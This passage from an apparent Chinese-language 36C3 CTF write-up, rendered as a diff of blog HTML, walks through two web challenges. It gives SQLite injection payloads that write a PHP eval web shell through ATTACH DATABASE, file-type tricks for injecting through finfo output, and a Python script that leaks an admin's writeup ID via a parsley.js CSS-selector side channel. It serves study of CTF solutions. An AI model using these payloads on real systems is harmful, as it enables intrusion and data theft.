+</span></span></span><span class=line><span class=cl><span class=err>            &lt;td&gt;&lt;?= $upload[1] ?&gt;&lt;/td&gt;
+</span></span></span><span class=line><span class=cl><span class=err>        &lt;/tr&gt;
+</span></span></span><span class=line><span class=cl><span class=err>    &lt;?php endforeach?&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/table&gt;
+</span></span></span></code></pre></div><p>题目功能点就是一个简单的文件上传，然后在自己的 sandbox 当中看到自己的文件类型，文件类型是由<code>(new finfo)->file</code>来判断的，还使用了 sqlite 进行存储文件上传的记录。</p><p>由于创建的数据库规定了 id 为自增长的整型主键，而且它使用了<code>lastInsertId()</code>返回最后一次 insert 数据的 id 作为文件名</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>move_uploaded_file</span><span class=p>(</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=nv>$d</span> <span class=o>.</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>lastInsertId</span><span class=p>())</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;move_upload_file&#39;</span><span class=p>);</span>
+</span></span></code></pre></div><p>所以我们基本上可以不用考虑是否存在通过可控文件名上传文件 Getshell 的操作了。</p><p>纵观整个文件，其实我们可以发现，我们可控制的输入点也只有在文件类型当中，文件类型又被拼入到了 sql 语句当中</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=nv>$s</span> <span class=o>=</span> <span class=s2>&#34;INSERT INTO upload(info) VALUES (&#39;&#34;</span> <span class=o>.</span><span class=p>(</span><span class=k>new</span> <span class=nx>finfo</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>])</span><span class=o>.</span> <span class=s2>&#34; &#39;);&#34;</span><span class=p>;</span>
+</span></span></code></pre></div><p>所以比较明显，我们只能通过这个来进行 sql 注入来进行一些操作了。</p><p>我的思路就是 fuzz 一些特殊的文件，可能存在某些文件使用<code>finfo</code>得出来的结果含有单引号什么的，并且我们还能够插入可控数据，于是我就开始 fuzz 文件头，从<code>0x00</code>到<code>0xff0xff</code>。</p><p>终于在<code>0x1f0x9d</code>得到一个文件类型是<code>compress'd data</code>，虽然有单引号，但是不存在我们可控的数据。</p><p>还有一个是<code>0xfb0x01</code>得到一个文件类型是<code>QDOS object ''</code>，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png loading=lazy></a></figure></p><p>发现这里被吃掉了一个<code>p</code>，于是我们调整一下 payload 就可以用来注入了。</p><p>sqlite 是可以用 .php 文件名来作为存储格式文件的，而且当前目录可写，于是我们就可以通过 sqlite attach 一个 z.php 的方法来写 shell 了。</p><pre tabindex=0><code class=language-sqlite data-lang=sqlite>ATTACH DATABASE &#39;z.php&#39; AS t;create TABLE t.e (d text);/*
+</code></pre><pre tabindex=0><code class=language-sqlite data-lang=sqlite>ATTACH DATABASE &#39;z.php&#39; AS t;insert INTO t.e (d) VALUES (&#39;&lt;?php eval($_POST[a])?&gt;&#39;);/*
+</code></pre><p>这里可能需要注意的就是有长度限制，所以我们需要分两次来写 shell</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png loading=lazy></a></figure></p><h3 id=other-file>other file</h3><p>看其他选手的公开的 wp 也是很有趣的一件事，然后从 ctftime 上公开的 wp，我们可以发现还存在着这么一些文件可以用来注入。</p><h4 id=tex-dvi-file>TeX DVI file</h4><p>0xf702 文件头，在填充一定数据后有我们完全可控的数据</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png loading=lazy></a></figure></p><h4 id=jpeg>jpeg</h4><p>在 jpeg 的 EXIF 数据段中有用来标识 software 的数据也是我们可控的地方，同样用来标识 comment 的地方我们也可控。于是我们可以使用 exiftool 来修改图片。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>exiftool -overwrite_original -comment<span class=o>=</span><span class=s2>&#34;payload&#34;</span> -software<span class=o>=</span><span class=s2>&#34;payload2&#34;</span> 1.jpg
+</span></span></code></pre></div><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png loading=lazy></a></figure></p><h4 id=heading>#!</h4><p>我们还可以利用<code>#!/</code>的文件来构造 payload</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png loading=lazy></a></figure></p><h4 id=gz>gz</h4><p>利用<code>gunzip</code>生成的 gz 文件，我们也可以用来注入，我们可控的数据是它的文件名</p><p><figure><a href=https://posts.xh4h.com/assets/images/36c3/gunzip1.png><img src=https://posts.xh4h.com/assets/images/36c3/gunzip1.png loading=lazy></a></figure></p><p>当然我们也可以直接修改 gz 文件内容</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png loading=lazy></a></figure></p><h2 id=writeupbin>WriteUpBin</h2><blockquote><p><strong>Difficulty estimate</strong>: medium</p><p><strong>Solved</strong>:13/321</p><p><strong>Points</strong>: round(1000 · min(1, 10 / (9 + [13 solves]))) = <strong>455</strong> points</p><p><strong>Description:</strong></p><p>Finally (again), a minimalistic, open-source social writeup hosting solution.</p><p><strong>Download:</strong></p><p><a class=link href=https://github.com/ZeddYu/36c3-CTF-Web/blob/master/writeupbin/WriteupBin-10b65573b511269f.tar.xz target=_blank rel=noopener>WriteupBin-10b65573b511269f.tar.xz</a></p></blockquote><p>一道比较有意思的侧信道题目，我们可以通过所给附件搭建形式知道，flag 存放在数据库当中，并且是在 admin 用户的第一条 writeup 数据的内容当中，题目提供简单的上传文本的功能，并且可以提交给 admin ，让 admin 给你点赞。</p><p>项目结构如下：</p><pre tabindex=0><code>.
 ├── Dockerfile							//Docker文件
 ├── admin.py								//使用selenium模拟admin登录并点赞
 ├── db.sql									//数据库文件
@@ -200,555 +77,266 @@ CTF
 │       ├── home.php				//页面中部用来提供给用户输入的界面
 │       └── show.php				//点赞、提交给admin的展示页面
 └── ynetd										//用来启动 admin.py
-</code></pre><p>既然 flag 在数据库当中，那我们可以首先来看看 show.php ，因为这个文件可以直接用来获取 writeup 的内容。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
-<span class=k>include_once</span> <span class=s1>&#39;../general.php&#39;</span><span class=p>;</span>
-
-<span class=nv>$stmt</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s1>&#39;SELECT id, content FROM `writeup` WHERE `id` = ?&#39;</span><span class=p>);</span>
-<span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>bind_param</span><span class=p>(</span><span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]);</span>
-<span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
-<span class=nv>$writeup</span> <span class=o>=</span> <span class=nx>mysqli_fetch_all</span><span class=p>(</span><span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>get_result</span><span class=p>(),</span> <span class=nx>MYSQLI_ASSOC</span><span class=p>)[</span><span class=mi>0</span><span class=p>];</span>
-
-
-<span class=nv>$stmt</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s1>&#39;SELECT user_id FROM `like` WHERE `writeup_id` = ?&#39;</span><span class=p>);</span>
-<span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>bind_param</span><span class=p>(</span><span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]);</span>
-<span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
-<span class=nv>$result</span> <span class=o>=</span> <span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>get_result</span><span class=p>();</span>
-<span class=nv>$likes</span> <span class=o>=</span> <span class=nx>mysqli_fetch_all</span><span class=p>(</span><span class=nv>$result</span><span class=p>,</span> <span class=nx>MYSQLI_ASSOC</span><span class=p>);</span>
-
-<span class=k>include</span><span class=p>(</span><span class=s1>&#39;../views/header.php&#39;</span><span class=p>);</span>
-<span class=k>include</span><span class=p>(</span><span class=s1>&#39;../views/show.php&#39;</span><span class=p>);</span>
-</code></pre></div><p>我们可以看到 id 并没有什么鉴权措施，也就是说，我们可以通过 writeup id 来获取 writeup 内容，而 flag writeup id 在 admin 用户数据当中，而在 header.php 中可以看到当前用户所有的 writeup id</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span> <span class=k>foreach</span><span class=p>(</span><span class=nv>$writeups</span> <span class=k>as</span> <span class=nv>$w</span><span class=p>)</span><span class=o>:</span> <span class=cp>?&gt;</span><span class=err>
-</span><span class=err>  &lt;li&gt;&lt;a href=&#34;/show.php?id=&lt;?= $w[&#39;id&#39;] ?&gt;&#34;&gt;Writeup - &lt;?= $w[&#39;id&#39;] ?&gt;&lt;/a&gt;&lt;/li&gt;
-</span><span class=err>&lt;?php endforeach; ?&gt;
-</span></code></pre></div><p>既然有提交代码给 admin 的功能，那么是不是有可能是一个 xss 或者什么的？</p>
-<p>我们还可以看到 admin 再收到 writeup 后的主要操作：</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>display</span> <span class=o>=</span> <span class=n>Display</span><span class=p>(</span><span class=n>visible</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=p>(</span><span class=mi>800</span><span class=p>,</span> <span class=mi>600</span><span class=p>))</span>
-<span class=n>display</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
-<span class=n>chrome_options</span> <span class=o>=</span> <span class=n>Options</span><span class=p>()</span>
-<span class=n>chrome_options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--disable-gpu&#39;</span><span class=p>)</span>
-<span class=n>chrome_options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--headless&#39;</span><span class=p>)</span>
-<span class=n>chrome_options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--no-sandbox&#39;</span><span class=p>)</span>
-<span class=n>driver</span> <span class=o>=</span> <span class=n>webdriver</span><span class=o>.</span><span class=n>Chrome</span><span class=p>(</span><span class=s1>&#39;/usr/bin/chromedriver&#39;</span><span class=p>,</span> <span class=n>options</span><span class=o>=</span><span class=n>chrome_options</span><span class=p>)</span>
-
-<span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id=&#39;</span><span class=o>+</span><span class=n>writeup_id</span>
-<span class=n>driver</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
-<span class=n>element</span> <span class=o>=</span> <span class=n>driver</span><span class=o>.</span><span class=n>find_element_by_xpath</span><span class=p>(</span><span class=s1>&#39;//input[@id=&#34;like&#34;]&#39;</span><span class=p>)</span>
-<span class=n>element</span><span class=o>.</span><span class=n>click</span><span class=p>()</span>
-
-<span class=n>driver</span><span class=o>.</span><span class=n>quit</span><span class=p>()</span>
-<span class=n>display</span><span class=o>.</span><span class=n>stop</span><span class=p>()</span>
-</code></pre></div><p>我们可以看到 admin 在进行登录之后使用<code>find_element_by_xpath</code>找到了 id 为 like 的 input 标签，并进行了点击，也就是提交给 admin 的 writeup 后，admin 会浏览进行点击，发送一个点赞请求</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;post&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/like.php&#34;</span><span class=p>&gt;</span>
-    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;c&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&lt;?= $_SESSION[&#39;c&#39;] ?&gt;&#34;</span><span class=p>&gt;</span>
-    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;id&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&lt;?= $writeup[&#39;id&#39;] ?&gt;&#34;</span><span class=p>&gt;</span>
-    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;like&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;👍&#34;</span><span class=p>&gt;</span>
-<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
-</code></pre></div><p>接着我们来看看 general.php 中的防御措施</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
-<span class=nx>session_start</span><span class=p>([</span><span class=s1>&#39;cookie_httponly&#39;</span> <span class=o>=&gt;</span> <span class=k>true</span><span class=p>,</span> <span class=s1>&#39;cookie_samesite&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Strict&#39;</span><span class=p>]);</span>
-<span class=c1>//...
-</span><span class=c1></span><span class=k>function</span> <span class=nf>id</span><span class=p>()</span> <span class=p>{</span>
-    <span class=k>return</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
-<span class=p>}</span>
-
-<span class=nv>$nonce</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>id</span><span class=p>());</span>
-<span class=c1>//...
-</span><span class=c1></span><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;x-xss-protection: 1; mode=block&#39;</span><span class=p>);</span>
-<span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-Content-Type-Options: nosniff&#39;</span><span class=p>);</span>
-<span class=nx>header</span><span class=p>(</span><span class=s1>&#39;x-frame-options: DENY&#39;</span><span class=p>);</span>
-<span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Referrer-Policy: no-referrer&#39;</span><span class=p>);</span>
-<span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Feature-Policy: geolocation &#39;none&#39;; midi &#39;none&#39;; sync-xhr &#39;none&#39;; microphone &#39;none&#39;; camera &#39;none&#39;; magnetometer &#39;none&#39;; gyroscope &#39;none&#39;; speaker &#39;none&#39;; fullscreen &#39;none&#39;; payment &#39;none&#39;; usb &#39;none&#39;; vr &#39;none&#39;; encrypted-media &#39;none&#39;&#34;</span><span class=p>);</span>
-<span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;nonce-&#34;</span><span class=o>.</span><span class=nv>$nonce</span><span class=o>.</span><span class=s2>&#34;&#39; https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri &#39;self&#39;; form-action &#39;self&#39;; frame-ancestors &#39;none&#39;; require-sri-for script style;&#34;</span><span class=p>);</span>
-</code></pre></div><p>而<code>script-src</code>设置的 nonce 只在 header.php 使用了，而且我们也拿不到这个 nonce</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;</span><span class=nx>script</span> <span class=nx>nonce</span><span class=o>=</span><span class=s2>&#34;&lt;?=</span><span class=si>$nonce</span><span class=s2>?&gt;&#34;</span><span class=o>&gt;</span>
-    <span class=err>$</span><span class=p>(</span><span class=s1>&#39;#publish-form&#39;</span><span class=p>)</span><span class=o>.</span><span class=nx>parsley</span><span class=p>()</span> <span class=c1>// prevent hacking
-</span><span class=c1></span><span class=o>&lt;/</span><span class=nx>script</span><span class=o>&gt;</span>
-</code></pre></div><p>所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个 js 文件入手，一个 jquery.js ，另一个 parsley.js。</p>
-<h3 id=parsleyjs>Parsley.js</h3>
-<p>我们可以去 <a class=link href=https://parsleyjs.org/doc/index.html target=_blank rel=noopener>parsley.js doc</a> 看到该 lib 的简单说明以及使用：</p>
-<blockquote>
-<p>Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users.</p>
-<p>Javascript form validation is not necessary, and if used, it <strong>does not replace strong backend server validation.</strong></p>
-<p>That&rsquo;s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices.</p>
-</blockquote>
-<p>可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的 API：</p>
-<blockquote>
-<p><strong>data-parsley-trigger=&ldquo;input&rdquo;</strong></p>
-<p>Specify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=&ldquo;focusin focusout&rdquo;. Default is null. See the various events supported by jQuery.</p>
-<p><strong>data-parsley-error-message=&ldquo;my message&rdquo;</strong></p>
-<p>Customize a unique global message for the field.</p>
-<p><strong>data-parsley-errors-container="#element"</strong></p>
-<p>Specify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source.</p>
-</blockquote>
-<p>根据文档，我们可以利用<code>data-parsley-trigger</code>设置我们的触发方式，使用<code>data-parsley-error-message</code>来自定义我们的错误信息，使用<code>data-parsley-errors-container</code>来自定义我们的显示错误的位置。</p>
-<p>根据文档，我们可以简单用一个<code>data-parsley-validate</code>指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如：</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>data-parsley-validate</span><span class=p>&gt;</span>
-        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> 
-            <span class=na>data-parsley-trigger</span><span class=o>=</span><span class=s>&#34;blur&#34;</span> <span class=na>autofocus</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;some-field&#34;</span>
-            <span class=na>data-parsley-error-message</span><span class=o>=</span><span class=s>&#34;&lt;input id=like type=button value=padyload&gt;&#34;</span> 
-            <span class=na>data-parsley-required</span>
-            <span class=na>data-parsley-errors-container</span><span class=o>=</span><span class=s>&#34;#div1&#34;</span><span class=p>/&gt;</span>
-<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
-</code></pre></div><p><code>data-parsley-trigger</code>指定了<code>blur</code>事件，也就是当我们的 input 失焦时，会显示我们的错误信息，并且在 id 为 div1 的元素中显示，更重要的是，浏览器也将其进行了渲染。</p>
-<p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png loading=lazy>
-</a>
-</figure></p>
-<p>###Click</p>
-<p>回到题目当中，admin 所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过 show.php 打开你的 writeup 内容，并且点击页面上 id 为 like 的 input 标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过 <code>selenium.webdriver</code>调用<code>find_element_by_xpath</code>函数得到的 id 为 like 的 input 元素只能有第一个，也就是说，即使我们在 writeup 内容中插入一个 id 为 like 的 input 标签，admin 也只会根据页面顺序拿到第一个点赞 input 。</p>
-<p>并且 CSP 也限制得很严格，似乎陷入了僵局，但是如果我们有以上 parsley.js 的知识，我们似乎可以通过错误信息来构造一些 Payload 。</p>
-<p>首先，因为<code>find_element_by_xpath</code>只会得到第一个 id 为 like 的 input 标签，而我们通过 parsley.js 可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的 id 为 like 的 input 标签插入到原来的点赞按钮之前。</p>
-<p>但是这有什么用呢？我们再来仔细看看 admin 要点赞的那个页面</p>
-<p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png loading=lazy>
-</a>
-</figure></p>
-<p>页面上部分是 header.php ，会展示当前用户所提交的 writeup ，也就是说 admin 的这个页面，第一个也是唯一一个 a 标签就是 flag 的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个 a 标签中的 href 属性值，或者更确切的说就是获取 writeup id 的事情了。</p>
-<h3 id=css-selector>CSS Selector</h3>
-<p>如何获取 a 标签中的 href 属性值貌似也就跟我们之前提到的<code>data-parsley-errors-container</code> API 有关了，而这个 API 又支持 CSS 选择器，那我们是不是可以通过 CSS 选择器来让我们的报错信息放到这个 a 标签之后呢，这样以来也就直接就放到了点赞按钮之前了。</p>
-<p>类似之前 XCTF Final 一个 CSS 侧信道的题目，我们可以通过利用<code>a[href^='/show.php?id={flag}]</code>的形式来进行元素选择。</p>
-<p>也就是说，当我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分完全匹配的时候，我们可以把一个无效的 id=like input 标签插入到该 a 标签之后，亦即真正用于提交 like 请求的 input 标签之前；如果我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分不完全匹配的，parsley.js 什么也不会做，admin 会正常地点赞，我们可以正常地在自己的 writeup 页面看到 admin 的点赞。</p>
-<p>所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取 flag 的 writeup id。</p>
-<p>脚本编写也比较简单：</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>requests</span>
-<span class=kn>import</span> <span class=nn>time</span>
-
-<span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
-
-<span class=n>base_url</span> <span class=o>=</span> <span class=s2>&#34;http://ip:8001/&#34;</span>
-
-<span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>base_url</span><span class=p>)</span>
-
-<span class=n>pos</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;name=&#34;c&#34; value=&#34;&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=s1>&#39;name=&#34;c&#34; value=&#34;&#39;</span><span class=p>)</span>
-<span class=n>csrftoken</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>[</span><span class=n>pos</span><span class=p>:</span><span class=n>pos</span><span class=o>+</span><span class=mi>16</span><span class=p>]</span>
-
-<span class=n>ss</span> <span class=o>=</span> <span class=s2>&#34;1234567890abcdef&#34;</span>
-<span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
-
-<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
-    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>ss</span><span class=p>:</span>
-        <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&lt;form data-parsley-validate&gt;&lt;input data-parsley-required data-parsley-trigger=</span><span class=se>\&#34;</span><span class=s2>blur</span><span class=se>\&#34;</span><span class=s2> data-parsley-error-message=&#39;&lt;input type=</span><span class=se>\&#34;</span><span class=s2>input</span><span class=se>\&#34;</span><span class=s2> id=like value=</span><span class=se>\&#34;</span><span class=s2>rebirth_is_really_nb</span><span class=se>\&#34;</span><span class=s2>&gt;&#39; data-parsley-errors-container=</span><span class=se>\&#34;</span><span class=s2>a[href^=&#39;/show.php?id=</span><span class=si>{</span><span class=n>flag</span> <span class=o>+</span> <span class=n>j</span><span class=si>}</span><span class=s2>&#39;]</span><span class=se>\&#34;</span><span class=s2> autofocus&gt;&lt;/form&gt;&#34;</span>
-        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;c&#39;</span><span class=p>:</span> <span class=n>csrftoken</span><span class=p>,</span> <span class=s1>&#39;content&#39;</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
-        <span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>base_url</span> <span class=o>+</span> <span class=s2>&#34;add.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>allow_redirects</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
-        <span class=c1># print(res.headers)</span>
-        <span class=n>location</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Location&#39;</span><span class=p>]</span>
-        <span class=n>pos</span> <span class=o>=</span> <span class=n>location</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;id=&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>3</span>
-        <span class=n>wp</span> <span class=o>=</span> <span class=n>location</span><span class=p>[</span><span class=n>pos</span><span class=p>:]</span>
-        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;c&#39;</span><span class=p>:</span> <span class=n>csrftoken</span><span class=p>,</span> <span class=s1>&#39;id&#39;</span><span class=p>:</span> <span class=n>wp</span><span class=p>}</span>
-        <span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>base_url</span> <span class=o>+</span> <span class=s2>&#34;admin.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
-        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
-
-        <span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;http://ip:8001/show.php?id=</span><span class=si>{</span><span class=n>wp</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
-        <span class=c1># print(res.text)</span>
-        <span class=n>txt</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
-        <span class=k>if</span> <span class=s2>&#34;Liked by&lt;/h3&gt;admin&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>txt</span><span class=p>:</span>
-            <span class=n>flag</span> <span class=o>+=</span> <span class=n>j</span>
-            <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>flag</span><span class=p>)</span>
-            <span class=k>break</span>
-</code></pre></div><p>拿到 writeup id 之后直接访问即可：</p>
-<p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png loading=lazy>
-</a>
-</figure></p>
-<h3 id=other-selector>Other Selector</h3>
-<p>当然该页面不仅可以使用 a 标签的 href 属性进行获取 writeup id，也可以获取它 value 值，例如：</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>data-parsley-validate</span><span class=p>&gt;</span>
-  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span><span class=p>&gt;</span>
-  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span>
-         <span class=na>id</span><span class=o>=</span><span class=s>&#34;like&#34;</span>
-         <span class=na>data-parsley-trigger</span><span class=o>=</span><span class=s>&#34;blur&#34;</span> <span class=na>autofocus</span>
-         <span class=na>name</span><span class=o>=</span><span class=s>&#34;some-field&#34;</span> 
-         <span class=na>data-parsley-error-message</span><span class=o>=</span><span class=s>&#34;&lt;input id=like type=button&gt;&#34;</span> <span class=na>data-parsley-required</span>
